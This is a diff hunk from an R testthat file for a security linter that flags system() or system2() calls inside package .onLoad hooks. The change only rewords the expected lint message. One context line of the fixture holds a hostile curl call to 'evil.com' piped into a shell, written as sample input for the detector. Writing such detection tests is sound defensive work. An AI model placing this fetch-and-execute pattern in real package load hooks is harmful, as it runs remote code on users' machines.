@@ -35,13 +35,13 @@ test_that("onload_calls_system_linter returns lint for system calls in hooks", {
     system2("curl", args = c("http://evil.com | sh"))
   }
   '
-  expect_lint(code1, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
+  expect_lint(code1, "system\\(\\) or system2\\(\\) inside \\.onLoad",
     lintrsecurity::onload_calls_system_linter())
-  expect_lint(code2, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
+  expect_lint(code2, "system\\(\\) or system2\\(\\) inside \\.onLoad",
     lintrsecurity::onload_calls_system_linter())
-  expect_lint(code3, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
+  expect_lint(code3, "system\\(\\) or system2\\(\\) inside \\.onLoad",
     lintrsecurity::onload_calls_system_linter())
-  expect_lint(code4, "system\\(\\) or system2\\(\\) calls inside \\.onLoad",
+  expect_lint(code4, "system\\(\\) or system2\\(\\) inside \\.onLoad",
     lintrsecurity::onload_calls_system_linter())
 })
 
